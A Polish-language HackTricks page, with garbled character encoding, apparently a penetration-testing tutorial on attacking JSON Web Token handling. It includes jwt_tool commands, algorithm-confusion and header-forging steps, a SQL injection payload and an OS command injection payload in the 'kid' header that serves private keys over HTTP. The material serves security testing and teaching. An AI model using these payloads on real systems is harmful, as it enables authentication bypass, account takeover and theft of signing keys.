# PodatnoÅ›ci JWT (Json Web Tokens)

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

JeÅ›li interesuje CiÄ™ **kariera w dziedzinie hakowania** i hakowanie niemoÅ¼liwych do zhakowania - **zatrudniamy!** (_wymagana biegÅ‚a znajomoÅ›Ä‡ jÄ™zyka polskiego w mowie i piÅ›mie_).

{% embed url="https://www.stmcyber.com/careers" %}

**CzÄ™Å›Ä‡ tego posta opiera siÄ™ na Å›wietnym poÅ›cie:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor doskonaÅ‚ego narzÄ™dzia do testowania penetracyjnego JWT** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Szybkie ZwyciÄ™stwa**

Uruchom [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) w trybie `All Tests!` i poczekaj na zielone linie
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
JeÅ›li masz szczÄ™Å›cie, narzÄ™dzie znajdzie przypadek, w ktÃ³rym aplikacja internetowa niepoprawnie sprawdza JWT:

![](<../.gitbook/assets/image (935).png>)

NastÄ™pnie moÅ¼esz wyszukaÄ‡ Å¼Ä…danie w swoim proxy lub wyciÄ…gnÄ…Ä‡ uÅ¼yty JWT dla tego Å¼Ä…dania za pomocÄ… narzÄ™dzia jwt\_ :
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Modyfikacja danych bez zmieniania niczego

MoÅ¼esz po prostu zmieniaÄ‡ dane, pozostawiajÄ…c sygnaturÄ™ bez zmian i sprawdziÄ‡, czy serwer sprawdza sygnaturÄ™. SprÃ³buj zmieniÄ‡ swojÄ… nazwÄ™ uÅ¼ytkownika na "admin" na przykÅ‚ad.

#### **Czy token jest sprawdzany?**

Aby sprawdziÄ‡, czy sygnatura JWT jest weryfikowana:

* Komunikat o bÅ‚Ä™dzie sugeruje trwajÄ…cÄ… weryfikacjÄ™; szczegÃ³Å‚y w wyczerpujÄ…cych bÅ‚Ä™dach powinny byÄ‡ sprawdzone.
* Zmiana na zwrÃ³conej stronie rÃ³wnieÅ¼ wskazuje na weryfikacjÄ™.
* Brak zmian sugeruje brak weryfikacji; wtedy moÅ¼na eksperymentowaÄ‡ z modyfikacjÄ… twierdzeÅ„ Å‚adunku.

### Pochodzenie

WaÅ¼ne jest ustalenie, czy token zostaÅ‚ wygenerowany po stronie serwera czy po stronie klienta, poprzez analizÄ™ historii Å¼Ä…daÅ„ proxy.

* Tokeny pochodzÄ…ce po raz pierwszy po stronie klienta sugerujÄ…, Å¼e klucz moÅ¼e byÄ‡ ujawniony w kodzie po stronie klienta, co wymaga dalszego zbadania.
* Tokeny pochodzÄ…ce po stronie serwera wskazujÄ… na bezpieczny proces.

### Czas trwania

SprawdÅº, czy token trwa dÅ‚uÅ¼ej niÅ¼ 24 godziny... moÅ¼e nigdy nie wygasa. JeÅ›li istnieje pole "exp", sprawdÅº, czy serwer poprawnie je obsÅ‚uguje.

### Brutalna siÅ‚a sekretu HMAC

[**Zobacz tÄ™ stronÄ™.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Zmiana algorytmu na None

Ustaw uÅ¼ywany algorytm jako "None" i usuÅ„ czÄ™Å›Ä‡ sygnatury.

UÅ¼yj rozszerzenia Burp o nazwie "JSON Web Token", aby wyprÃ³bowaÄ‡ tÄ™ podatnoÅ›Ä‡ i zmieniÄ‡ rÃ³Å¼ne wartoÅ›ci wewnÄ…trz JWT (wyÅ›lij Å¼Ä…danie do Repeater, a w karcie "JSON Web Token" moÅ¼esz modyfikowaÄ‡ wartoÅ›ci tokena. MoÅ¼esz rÃ³wnieÅ¼ wybraÄ‡ wartoÅ›Ä‡ pola "Alg" jako "None").

### Zmiana algorytmu z RS256 (asymetryczny) na HS256 (symetryczny) (CVE-2016-5431/CVE-2016-10555)

Algorytm HS256 uÅ¼ywa klucza tajnego do podpisywania i weryfikowania kaÅ¼dej wiadomoÅ›ci.\
Algorytm RS256 uÅ¼ywa klucza prywatnego do podpisywania wiadomoÅ›ci i klucza publicznego do uwierzytelniania.

JeÅ›li zmienisz algorytm z RS256 na HS256, kod backendu uÅ¼yje klucza publicznego jako klucza tajnego, a nastÄ™pnie uÅ¼yje algorytmu HS256 do weryfikacji sygnatury.

NastÄ™pnie, korzystajÄ…c z klucza publicznego i zmieniajÄ…c RS256 na HS256, moÅ¼emy utworzyÄ‡ poprawnÄ… sygnaturÄ™. MoÅ¼esz pobraÄ‡ certyfikat serwera internetowego wykonujÄ…c to:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nowy klucz publiczny w nagÅ‚Ã³wku

AtakujÄ…cy osadza nowy klucz w nagÅ‚Ã³wku tokena, a serwer uÅ¼ywa tego nowego klucza do weryfikacji sygnatury (CVE-2018-0114).

MoÅ¼na to zrobiÄ‡ za pomocÄ… rozszerzenia Burp "JSON Web Tokens".\
(WyÅ›lij Å¼Ä…danie do Repeater, w zakÅ‚adce JSON Web Token wybierz "CVE-2018-0114" i wyÅ›lij Å¼Ä…danie).

### Podmiana JWKS

Instrukcje opisujÄ… metodÄ™ oceny bezpieczeÅ„stwa tokenÃ³w JWT, zwÅ‚aszcza tych korzystajÄ…cych z nagÅ‚Ã³wka "jku". Ten nagÅ‚Ã³wek powinien prowadziÄ‡ do pliku JWKS (JSON Web Key Set), ktÃ³ry zawiera klucz publiczny niezbÄ™dny do weryfikacji tokenu.

* **Ocena TokenÃ³w z NagÅ‚Ã³wkiem "jku"**:
* Zweryfikuj adres URL z nagÅ‚Ã³wkiem "jku", aby upewniÄ‡ siÄ™, Å¼e prowadzi do odpowiedniego pliku JWKS.
* Zmodyfikuj wartoÅ›Ä‡ "jku" tokenu, aby kierowaÄ‡ jÄ… do kontrolowanego serwisu internetowego, umoÅ¼liwiajÄ…c obserwacjÄ™ ruchu.
* **Monitorowanie Interakcji HTTP**:
* Obserwacja Å¼Ä…daÅ„ HTTP do okreÅ›lonego adresu URL wskazuje na prÃ³by serwera pobrania kluczy z podanego linku.
* Podczas korzystania z `jwt_tool` w tym procesie, waÅ¼ne jest zaktualizowanie pliku `jwtconf.ini` z lokalizacjÄ… Twojego osobistego pliku JWKS, aby uÅ‚atwiÄ‡ testowanie.
* **Polecenie dla `jwt_tool`**:
*   Wykonaj poniÅ¼sze polecenie, aby zasymulowaÄ‡ scenariusz za pomocÄ… `jwt_tool`:

```bash
python3 jwt_tool.py JWT_TUTAJ -X s
```

### PrzeglÄ…d problemÃ³w z "kid"

Opcjonalny nagÅ‚Ã³wek znany jako `kid` jest wykorzystywany do identyfikacji konkretnego klucza, co staje siÄ™ istotne w Å›rodowiskach, gdzie istnieje wiele kluczy do weryfikacji sygnatury tokenu. Ten nagÅ‚Ã³wek pomaga w wyborze odpowiedniego klucza do weryfikacji sygnatury tokenu.

#### Ujawnianie klucza poprzez "kid"

Gdy nagÅ‚Ã³wek `kid` jest obecny, zaleca siÄ™ wyszukiwanie katalogu sieciowego w poszukiwaniu odpowiadajÄ…cego pliku lub jego wariantÃ³w. Na przykÅ‚ad, jeÅ›li `"kid":"klucz/12345"` jest okreÅ›lony, pliki _/klucz/12345_ i _/klucz/12345.pem_ powinny byÄ‡ wyszukiwane w gÅ‚Ã³wnym katalogu sieciowym.

#### Traversal Å›cieÅ¼ki z "kid"

NagÅ‚Ã³wek `kid` moÅ¼e rÃ³wnieÅ¼ byÄ‡ wykorzystany do nawigacji po systemie plikÃ³w, potencjalnie umoÅ¼liwiajÄ…c wybÃ³r dowolnego pliku. MoÅ¼liwe jest testowanie Å‚Ä…cznoÅ›ci lub wykonywanie atakÃ³w Server-Side Request Forgery (SSRF) poprzez zmianÄ™ wartoÅ›ci `kid` w celu celowania w konkretne pliki lub usÅ‚ugi. Zmiana tokenu JWT w celu zmiany wartoÅ›ci `kid` zachowujÄ…c oryginalnÄ… sygnaturÄ™ moÅ¼e byÄ‡ osiÄ…gniÄ™ta za pomocÄ… flagi `-T` w jwt\_tool, jak pokazano poniÅ¼ej:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Poprzez celowanie w pliki z przewidywalnÄ… zawartoÅ›ciÄ…, moÅ¼liwe jest sfaÅ‚szowanie poprawnego JWT. Na przykÅ‚ad plik `/proc/sys/kernel/randomize_va_space` w systemach Linux, zawierajÄ…cy znanÄ… wartoÅ›Ä‡ **2**, moÅ¼e byÄ‡ uÅ¼yty w parametrze `kid` z **2** jako symetrycznym hasÅ‚em do generowania JWT.

#### WstrzykniÄ™cie SQL poprzez "kid"

JeÅ›li zawartoÅ›Ä‡ claimu `kid` jest wykorzystywana do pobrania hasÅ‚a z bazy danych, atak SQL injection moÅ¼e zostaÄ‡ uÅ‚atwiony poprzez modyfikacjÄ™ Å‚adunku `kid`. PrzykÅ‚adowy Å‚adunek wykorzystujÄ…cy wstrzykniÄ™cie SQL do zmiany procesu podpisywania JWT to:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Ta zmiana wymusza uÅ¼ycie znanego klucza tajnego, `ATTACKER`, do podpisywania JWT.

#### WstrzykniÄ™cie OS poprzez "kid"

Scenariusz, w ktÃ³rym parametr `kid` okreÅ›la Å›cieÅ¼kÄ™ pliku uÅ¼ywanÄ… w kontekÅ›cie wykonania polecenia, moÅ¼e prowadziÄ‡ do podatnoÅ›ci na zdalne wykonanie kodu (RCE). Poprzez wstrzykniÄ™cie poleceÅ„ do parametru `kid`, moÅ¼liwe jest ujawnienie prywatnych kluczy. PrzykÅ‚adowy Å‚adunek do osiÄ…gniÄ™cia RCE i ujawnienia kluczy to:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u i jku

#### jku

jku oznacza **JWK Set URL**.\
JeÅ›li token uÅ¼ywa claimu nagÅ‚Ã³wka "**jku**", **sprawdÅº podany adres URL**. Powinien on wskazywaÄ‡ na adres URL zawierajÄ…cy plik JWKS, ktÃ³ry przechowuje klucz publiczny do weryfikacji tokenu. Zmodyfikuj token, aby wskazywaÅ‚ wartoÅ›Ä‡ jku na usÅ‚ugÄ™ sieciowÄ…, ktÃ³rÄ… moÅ¼esz monitorowaÄ‡ pod kÄ…tem ruchu.

Najpierw musisz utworzyÄ‡ nowy certyfikat z nowymi kluczami prywatnymi i publicznymi.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
NastÄ™pnie moÅ¼esz na przykÅ‚ad uÅ¼yÄ‡ [**jwt.io**](https://jwt.io), aby utworzyÄ‡ nowy JWT z **utworzonymi kluczami publicznymi i prywatnymi oraz wskazujÄ…c parametr jku na utworzony certyfikat.** Aby utworzyÄ‡ poprawny certyfikat jku, moÅ¼esz pobraÄ‡ oryginalny i zmieniÄ‡ wymagane parametry.

MoÅ¼esz uzyskaÄ‡ parametry "e" i "n" z certyfikatu publicznego, uÅ¼ywajÄ…c:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. URI wskazujÄ…cy na zestaw publicznych certyfikatÃ³w X.509 (standard formatu certyfikatu) zakodowanych w formacie PEM. Pierwszy certyfikat w zestawie musi byÄ‡ tym, ktÃ³ry zostaÅ‚ uÅ¼yty do podpisania tego JWT. Kolejne certyfikaty podpisujÄ… poprzedni, w ten sposÃ³b uzupeÅ‚niajÄ…c Å‚aÅ„cuch certyfikatÃ³w. X.509 jest zdefiniowany w RFC 52807. Wymagane jest zabezpieczenie transportu do przesyÅ‚ania certyfikatÃ³w.

SprÃ³buj **zmieniÄ‡ ten nagÅ‚Ã³wek na URL pod twojÄ… kontrolÄ…** i sprawdÅº, czy otrzymujesz jakieÅ› Å¼Ä…danie. W takim przypadku **moÅ¼esz sfaÅ‚szowaÄ‡ JWT**.

Aby sfaÅ‚szowaÄ‡ nowy token, uÅ¼ywajÄ…c certyfikatu kontrolowanego przez ciebie, musisz utworzyÄ‡ certyfikat i wyodrÄ™bniÄ‡ klucze publiczny i prywatny:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
NastÄ™pnie moÅ¼esz uÅ¼yÄ‡ na przykÅ‚ad [**jwt.io**](https://jwt.io), aby utworzyÄ‡ nowy JWT z **utworzonymi kluczami publicznymi i prywatnymi oraz wskazujÄ…c parametr x5u na certyfikat .crt utworzony.**

![](<../.gitbook/assets/image (956).png>)

MoÅ¼esz rÃ³wnieÅ¼ wykorzystaÄ‡ obie te luki **do atakÃ³w SSRF**.

#### x5c

Ten parametr moÅ¼e zawieraÄ‡ **certyfikat w formacie base64**:

![](<../.gitbook/assets/image (1119).png>)

JeÅ›li atakujÄ…cy **wygeneruje certyfikat podpisany wÅ‚asnorÄ™cznie** i utworzy sfaÅ‚szowany token, uÅ¼ywajÄ…c odpowiadajÄ…cego klucza prywatnego, a nastÄ™pnie zastÄ…pi wartoÅ›Ä‡ parametru "x5c" nowo wygenerowanym certyfikatem i zmodyfikuje inne parametry, mianowicie n, e i x5t, to w rezultacie sfaÅ‚szowany token zostanie zaakceptowany przez serwer.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Osadzony klucz publiczny (CVE-2018-0114)

JeÅ›li JWT zawiera osadzony klucz publiczny, jak w poniÅ¼szym scenariuszu:

![](<../.gitbook/assets/image (624).png>)

Za pomocÄ… nastÄ™pujÄ…cego skryptu nodejs moÅ¼na wygenerowaÄ‡ klucz publiczny z tych danych:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
MoÅ¼liwe jest wygenerowanie nowego klucza prywatnego/publicznego, osadzenie nowego klucza publicznego wewnÄ…trz tokena i uÅ¼ycie go do wygenerowania nowego podpisu:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
MoÅ¼esz uzyskaÄ‡ "n" i "e" za pomocÄ… tego skryptu nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### ES256: Ujawnienie prywatnego klucza przy uÅ¼yciu tego samego numeru

JeÅ›li niektÃ³re aplikacje uÅ¼ywajÄ… ES256 i korzystajÄ… z tego samego numeru do generowania dwÃ³ch jwt, to moÅ¼liwe jest odtworzenie prywatnego klucza.

Oto przykÅ‚ad: [ECDSA: Ujawnienie prywatnego klucza przy uÅ¼yciu tego samego numeru (z SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

Twierdzenie JTI (JWT ID) zapewnia unikalny identyfikator dla tokenu JWT. MoÅ¼e byÄ‡ uÅ¼ywany do zapobiegania odtwarzaniu tokenu.\
Jednak wyobraÅº sobie sytuacjÄ™, w ktÃ³rej maksymalna dÅ‚ugoÅ›Ä‡ ID wynosi 4 (0001-9999). Å»Ä…danie 0001 i 10001 bÄ™dÄ… korzystaÄ‡ z tego samego ID. Dlatego jeÅ›li serwer zwiÄ™ksza ID przy kaÅ¼dym Å¼Ä…daniu, moÅ¼na to wykorzystaÄ‡ do **odtwarzania Å¼Ä…dania** (konieczne jest wysÅ‚anie 10000 Å¼Ä…daÅ„ miÄ™dzy kaÅ¼dym udanym odtworzeniem).

### Zarejestrowane twierdzenia JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Inne ataki

**Ataki przekazywania miÄ™dzyusÅ‚ugowego**

ZauwaÅ¼ono, Å¼e niektÃ³re aplikacje internetowe polegajÄ… na zaufanym serwisie JWT do generowania i zarzÄ…dzania swoimi tokenami. ZdarzaÅ‚y siÄ™ sytuacje, w ktÃ³rych token wygenerowany dla jednego klienta przez usÅ‚ugÄ™ JWT zostaÅ‚ zaakceptowany przez innego klienta tej samej usÅ‚ugi JWT. JeÅ›li obserwuje siÄ™ wydanie lub odnowienie JWT za poÅ›rednictwem usÅ‚ugi innej firmy, naleÅ¼y zbadaÄ‡ moÅ¼liwoÅ›Ä‡ zarejestrowania siÄ™ na koncie innego klienta tej usÅ‚ugi za pomocÄ… tego samego nazwy uÅ¼ytkownika/adresu e-mail. NastÄ™pnie moÅ¼na sprÃ³bowaÄ‡ odtworzyÄ‡ uzyskany token w Å¼Ä…daniu do celu, aby sprawdziÄ‡, czy zostanie zaakceptowany.

* Akceptacja twojego tokenu moÅ¼e wskazywaÄ‡ na powaÅ¼ny problem, ktÃ³ry potencjalnie pozwala na podszywanie siÄ™ pod dowolne konto uÅ¼ytkownika. NaleÅ¼y jednak zauwaÅ¼yÄ‡, Å¼e konieczne moÅ¼e byÄ‡ uzyskanie zgody na szersze testowanie, jeÅ›li chodzi o rejestracjÄ™ w aplikacji innej firmy, poniewaÅ¼ moÅ¼e to wprowadziÄ‡ w obszar szarej strefy prawniczej.

**Sprawdzanie waÅ¼noÅ›ci tokenÃ³w**

WaÅ¼noÅ›Ä‡ tokenu jest sprawdzana za pomocÄ… twierdzenia Å‚adunku "exp". BiorÄ…c pod uwagÄ™, Å¼e JWT sÄ… czÄ™sto uÅ¼ywane bez informacji sesyjnych, wymagane jest ostroÅ¼ne postÄ™powanie. W wielu przypadkach przechwycenie i odtworzenie tokenu innego uÅ¼ytkownika moÅ¼e umoÅ¼liwiÄ‡ podszywanie siÄ™ pod tego uÅ¼ytkownika. RFC dotyczÄ…cy JWT zaleca Å‚agodzenie atakÃ³w powtÃ³rnego przesyÅ‚ania JWT poprzez wykorzystanie twierdzenia "exp" do ustawienia czasu waÅ¼noÅ›ci tokenu. Ponadto istotne jest, aby aplikacja wdroÅ¼yÅ‚a odpowiednie sprawdzenia, aby zapewniÄ‡ przetwarzanie tej wartoÅ›ci i odrzucanie wygasÅ‚ych tokenÃ³w. JeÅ›li token zawiera twierdzenie "exp" i limity czasowe testÃ³w na to pozwalajÄ…, zaleca siÄ™ przechowywanie tokenu i jego ponowne przesÅ‚anie po upÅ‚ywie czasu waÅ¼noÅ›ci. ZawartoÅ›Ä‡ tokenu, w tym analiza znacznikÃ³w czasu i sprawdzanie waÅ¼noÅ›ci (znacznik czasu w formacie UTC), moÅ¼na odczytaÄ‡ za pomocÄ… flagi -R narzÄ™dzia jwt\_tool.

* Istnieje ryzyko bezpieczeÅ„stwa, jeÅ›li aplikacja nadal waliduje token, co moÅ¼e sugerowaÄ‡, Å¼e token nigdy nie wygaÅ›nie.

### NarzÄ™dzia

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

JeÅ›li interesuje CiÄ™ **kariera hakera** i haking tego, co niemoÅ¼liwe - **rekrutujemy!** (_wymagana biegÅ‚a znajomoÅ›Ä‡ jÄ™zyka polskiego w mowie i piÅ›mie_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
